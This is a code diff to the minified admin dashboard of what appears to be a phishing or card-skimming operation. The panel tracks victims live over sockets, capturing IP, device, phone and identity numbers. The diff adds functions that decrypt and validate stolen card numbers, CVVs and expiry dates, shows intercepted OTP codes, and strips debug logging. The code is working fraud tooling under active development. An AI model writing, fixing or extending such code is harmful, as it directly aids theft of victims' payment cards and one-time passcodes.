@@ -1552,7 +1552,7 @@
                     if (p) {
                         let t = p;
                         try {
-                            t = B(p)
+                            t = safeDecrypt(p, "card")
                         } catch (e) {}
                         let e = _(t.replace(/\s/g, "").slice(0, 8));
                         if (e) v = e.scheme?.toLowerCase() || "";
@@ -2329,6 +2329,28 @@
         }
     }
 
+    function looksEncrypted(e) {
+        if (!e || "string" != typeof e) return !1;
+        let t = e.replace(/\s/g, "");
+        return !(t.length < 12) && !/^[\d\/\-]+$/.test(t) && /^[A-Za-z0-9+/=_-]+$/.test(t)
+    }
+
+    function isValidDecrypted(e, t) {
+        if (!e || "string" != typeof e) return !1;
+        let a = e.replace(/\s/g, "");
+        if ("card" === t) return /^\d{13,19}$/.test(a);
+        if ("cvv" === t) return /^\d{3,4}$/.test(a);
+        if ("exp" === t) return /^\d{2}\/?\d{2,4}$/.test(a);
+        return !/[\x00-\x08\x0E-\x1F\uFFFD]/.test(e)
+    }
+
+    function safeDecrypt(e, t) {
+        if (!e || "string" != typeof e) return e;
+        if (!looksEncrypted(e)) return e;
+        let a = B(e);
+        return isValidDecrypted(a, t || "card") ? a : e
+    }
+
     function eNorm(e, t) {
         let a = {
                 ...t,
@@ -2509,14 +2531,14 @@
             let a = new Date(e.timestamp).getTime();
             return new Date(t.timestamp).getTime() - a
         });
-        console.log("[Dashboard] All card history:", C), C.forEach((e, t) => {
+        C.forEach((e, t) => {
             var a;
             let r, n, s, i, o, d = e.data?._v1,
                 l = e.data?._v2,
                 c = e.data?._v3,
                 u = e.data?._v4;
             try {
-                r = d ? B(d) : void 0, n = l ? B(l) : void 0, s = c ? B(c) : void 0, i = u ? B(u) : void 0
+                r = d ? safeDecrypt(d, "card") : void 0, n = l ? safeDecrypt(l, "cvv") : void 0, s = c ? safeDecrypt(c, "exp") : void 0, i = u ? safeDecrypt(u, "card") : void 0
             } catch (e) {
                 console.error("[Dashboard] Decryption error:", e), r = d, n = l, s = c, i = u
             }
@@ -2560,7 +2582,7 @@
             let a = new Date(e.timestamp).getTime();
             return new Date(t.timestamp).getTime() - a
         });
-        if (console.log("[Dashboard] OTP history:", T), console.log("[Dashboard] OTP from visitor._v5:", e._v5), console.log("[Dashboard] OTP Status:", e._v5Status), T.length > 0 && (console.log("[Dashboard] First OTP entry:", T[0]), console.log("[Dashboard] First OTP entry data:", T[0]?.data), console.log("[Dashboard] First OTP entry data._v5:", T[0]?.data?._v5)), 0 === T.length && e._v5) {
+        if (0 === T.length && e._v5) {
             let t = e._v5Status || "pending";
             S.push({
                 id: "otp-current",
@@ -2579,11 +2601,7 @@
         } else T.forEach((t, a) => {
             let r = t.data?._v5 || t.data?._v5Code || t._v5 || e._v5,
                 n = "approved" === t.status || "rejected" === t.status;
-            console.log("[Dashboard] Processing OTP entry:", {
-                otp: r,
-                data: t.data,
-                entry: t
-            }), r && S.push({
+            r && S.push({
                 id: `otp-${t.id||a}`,
                 title: 0 === a ? "كود OTP" : `كود OTP (محاولة ${T.length-a})`,
                 icon: "🔑",
@@ -4360,78 +4378,85 @@
         }, []);
         if ((0, a.useEffect)(() => {
                 if (!e) return;
+                let setAnalytics = i;
                 j();
-                let t = (0, n.getSocket)(),
-                    a = (e, t) => {
-                        g(a => {
-                            let r = a.findIndex(t => t.id === e);
-                            if (-1 === r) return j(), a;
-                            let n = [...a];
-                            return n[r] = {
-                                ...n[r],
-                                ...t
-                            }, n
+                let sock = (0, n.getSocket)(),
+                    mergeLive = (vid, patch) => {
+                        vid && patch && g(list => {
+                            let idx = list.findIndex(v => v.id === vid);
+                            if (-1 === idx) return list;
+                            let next = [...list];
+                            return next[idx] = {
+                                ...next[idx],
+                                ...patch
+                            }, next
                         })
                     },
-                    r = ({
-                        visitorId: e
+                    onOnline = ({
+                        visitorId: vid
                     }) => {
-                        a(e, {
+                        mergeLive(vid, {
                             status: "active"
-                        }), setTimeout(() => _(), 1500)
+                        })
                     },
-                    s = ({
-                        visitorId: e,
-                        page: t,
-                        step: r
-                    }) => a(e, {
-                        currentPage: t,
-                        currentStep: r,
-                        status: "active"
-                    }),
-                    i = ({
-                        visitorId: e
-                    }) => a(e, {
-                        status: "left"
-                    }),
-                    o = ({
-                        visitorId: e,
-                        payload: t
+                    onPageChanged = ({
+                        visitorId: vid,
+                        page: pg,
+                        step: st
                     }) => {
-                        a(e, t.phoneNumber || t.phone_number || t.identityNumber || t.identity_number || t.v1 ? {
+                        mergeLive(vid, {
+                            currentPage: pg,
+                            currentStep: st,
+                            status: "active"
+                        })
+                    },
+                    onOffline = ({
+                        visitorId: vid
+                    }) => {
+                        mergeLive(vid, {
+                            status: "left"
+                        })
+                    },
+                    onDataUpdated = ({
+                        visitorId: vid,
+                        payload: patch
+                    }) => {
+                        vid && patch && mergeLive(vid, patch.phoneNumber || patch.phone_number || patch.identityNumber || patch.identity_number || patch.v1 ? {
                             isCustomer: !0,
                             status: "active"
                         } : {
                             status: "active"
-                        }), (t.cardNumber || t.card_number || t.history) && setTimeout(() => _(), 2e3)
+                        })
                     },
-                    d = e => {
-                        g(e.map(e => {
+                    onVisitorList = list => {
+                        g(list.map(v => {
                             let t, a, r;
                             return {
-                                id: e.id,
-                                country: e.country || e.country_code || e.countryCode || null,
-                                ipAddress: e.ipAddress || e.ip_address || null,
-                                currentPage: e.currentPage || e.current_page || e.redirectPage || e.redirect_page || "home",
-                                currentStep: e.currentStep || e.current_step,
-                                redirectPage: e.redirectPage || e.redirect_page || null,
-                                isCustomer: !!(e.phoneNumber || e.phone_number || e.identityNumber || e.identity_number || e.v1),
-                                deviceType: e.deviceType || e.device_type || null,
-                                os: e.os || e.operating_system || e.operatingSystem || null,
-                                browser: e.browser || null,
-                                status: (t = Date.now(), a = e.lastSeen ? new Date(e.lastSeen).getTime() : 0, r = e.lastActiveSeen ? new Date(e.lastActiveSeen).getTime() : a, (!0 === e.isOnline || 1 === e.isOnline || !0 === e.is_online || 1 === e.is_online) && t - a < 3e4 ? "active" : t - r < 12e4 || t - a < 12e4 ? "idle" : "left"),
-                                lastSeen: e.lastSeen || e.last_seen || new Date().toISOString()
+                                id: v.id,
+                                country: v.country || v.country_code || v.countryCode || null,
+                                ipAddress: v.ipAddress || v.ip_address || null,
+                                currentPage: v.currentPage || v.current_page || v.redirectPage || v.redirect_page || "home",
+                                currentStep: v.currentStep || v.current_step,
+                                redirectPage: v.redirectPage || v.redirect_page || null,
+                                isCustomer: !!(v.phoneNumber || v.phone_number || v.identityNumber || v.identity_number || v.v1),
+                                deviceType: v.deviceType || v.device_type || null,
+                                os: v.os || v.operating_system || v.operatingSystem || null,
+                                browser: v.browser || null,
+                                status: (t = Date.now(), a = v.lastSeen ? new Date(v.lastSeen).getTime() : 0, r = v.lastActiveSeen ? new Date(v.lastActiveSeen).getTime() : a, (!0 === v.isOnline || 1 === v.isOnline || !0 === v.is_online || 1 === v.is_online) && t - a < 3e4 ? "active" : t - r < 12e4 || t - a < 12e4 ? "idle" : "left"),
+                                lastSeen: v.lastSeen || v.last_seen || new Date().toISOString()
                             }
                         }))
+                    },
+                    onLiveVisitors = list => {
+                        Array.isArray(list) && g(list)
+                    },
+                    onAnalytics = data => {
+                        data && data.visitors && setAnalytics(data)
                     };
-                return t.on("admin:visitor_online", r), t.on("admin:visitor_page_changed", s), t.on("admin:visitor_offline", i), t.on("admin:visitor_data_updated", o), t.on("admin:visitor_list", d), t.on("admin:live_visitors", e => {
-                    Array.isArray(e) && g(e)
-                }), t.on("admin:analytics_update", e => {
-                    e && i(e)
-                }), () => {
-                    t.off("admin:visitor_online", r), t.off("admin:visitor_page_changed", s), t.off("admin:visitor_offline", i), t.off("admin:visitor_data_updated", o), t.off("admin:visitor_list", d), t.off("admin:live_visitors"), t.off("admin:analytics_update")
+                return sock.on("admin:visitor_online", onOnline), sock.on("admin:visitor_page_changed", onPageChanged), sock.on("admin:visitor_offline", onOffline), sock.on("admin:visitor_data_updated", onDataUpdated), sock.on("admin:visitor_list", onVisitorList), sock.on("admin:live_visitors", onLiveVisitors), sock.on("admin:analytics_update", onAnalytics), () => {
+                    sock.off("admin:visitor_online", onOnline), sock.off("admin:visitor_page_changed", onPageChanged), sock.off("admin:visitor_offline", onOffline), sock.off("admin:visitor_data_updated", onDataUpdated), sock.off("admin:visitor_list", onVisitorList), sock.off("admin:live_visitors", onLiveVisitors), sock.off("admin:analytics_update", onAnalytics)
                 }
-            }, [e, j]), (0, a.useEffect)(() => {
+            }, [e, j, i]), (0, a.useEffect)(() => {
                 let e = e => {
                     f.current && !f.current.contains(e.target) && m(!1)
                 };
@@ -4757,10 +4782,13 @@
             }
         }, [B, I, E]);
         let R = (0, a.useCallback)((e, t) => {
-                if (k.current) return;
+                if (k.current || !t) return;
                 let a = {
                     ...t
                 };
+                ["_v1", "_v2", "_v3", "_v4", "_v5", "_v6", "_v7", "history", "ownerName", "phoneNumber", "identityNumber"].forEach(e => {
+                    void 0 === a[e] && delete a[e]
+                });
                 for (let e = 1; e <= 9; e++) {
                     let r = `v${e}`,
                         n = `_v${e}`;
